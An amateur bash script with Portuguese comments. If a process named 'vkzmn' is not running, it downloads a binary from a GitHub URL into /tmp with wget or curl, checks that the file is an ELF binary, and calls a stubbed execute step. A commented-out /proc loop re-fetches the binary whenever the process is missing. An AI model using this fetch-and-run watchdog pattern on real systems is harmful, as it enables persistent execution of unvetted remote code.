

execute_vkzmn() {


echo executando vkzmn





}




#############################################################


check_file() {



#chek vkzmn  is instaledd in /tmp


ls  /tmp/vkzmn   


 
if (( $? )) ; then


echo vkzmn not found


check_wget_curl 



else 



echo  vkzmn ja esta em /tmp


magic



fi ; 


}




#############################################################



magic() {  #check  if file is  ELF



command -v file


if ((  $? )) ; then #if  last err not 0 file not found


echo using od  to verify   magic header

exit

fi;




elf=0




file_vkzmn=$(file  /tmp/vkzmn)



for h in $file_vkzmn ; do


if [[ $h  =  "ELF" ]] ; then


elf=1


fi ;

done




#mais uma checagem  


   
hex=$( od    /tmp/vkzmn | head -n  1  )


for x in $hex ; do



#octal num 042577
 


if [ $x -eq  '042577' ] ; then


elf=$((  $elf  +   1   ))


fi;

done




if [  $elf  -eq 2  ]  ; then

echo e um elf valido

execute_vkzmn

else 

echo nao e um elf valido

fi;

exit


}









####################################################################

down_curl() {

echo usando o curl

curl  -L https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -o /tmp/vkzmn

check_file


}



####################################################################

down_wget() {


echo usando wget

wget https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -O /tmp/vkzmn

check_file



}


#########################################################################


check_wget_curl() {



command -v wget 


if (( $? )) ; then #if last err not  0  wget not found

echo wget not found

else

down_wget      #wget ok

exit

fi;


command -v curl  


if (( $?  )) ; then  #if last  err  not 0  curl not found

echo curl not found


else


down_curl #curl ok

fi;


}



# -------------------------------------------


main() {


vkzmn_ok=0




#simple verification



command -v pgrep 


if (( $? )) ; then #if last err not 0 pgrep not instaled

echo pgrep not instaled
 
exit


fi;



if  [  $? -eq  0 ]  ; then 


echo pgrep instaled

pgrep vkzmn


if  [  $? -eq   1 ]  ; then    #vkzmn not in execution

vkzmn_ok=1

fi ;



if (( $vkzmn_ok )) ; then 


echo vkzmn nao esta em execucao


check_file 



fi ;




fi;










echo main em manutencao

exit



#complex verification


true=1000

while true ; do

vkzmn_ok=0

dir_proc=$( ls  /proc )

for  pid  in   $dir_proc ; do

if  ((  $pid  >  0  )) ; then

comm=$( cat  /proc/$pid/comm )

for  cc in  $comm ; do

if [ $cc  =  "vkzmn" ] ; then

vkzmn_ok=$true

fi ; 
               
done

fi; 

done

if   [  $vkzmn_ok   -eq    $true   ]  ; then

echo vkzmn_ok

else 

echo  vkzmn_not_ok

check_file   

fi ; 


done

}


main
 
#execute_vkzmn
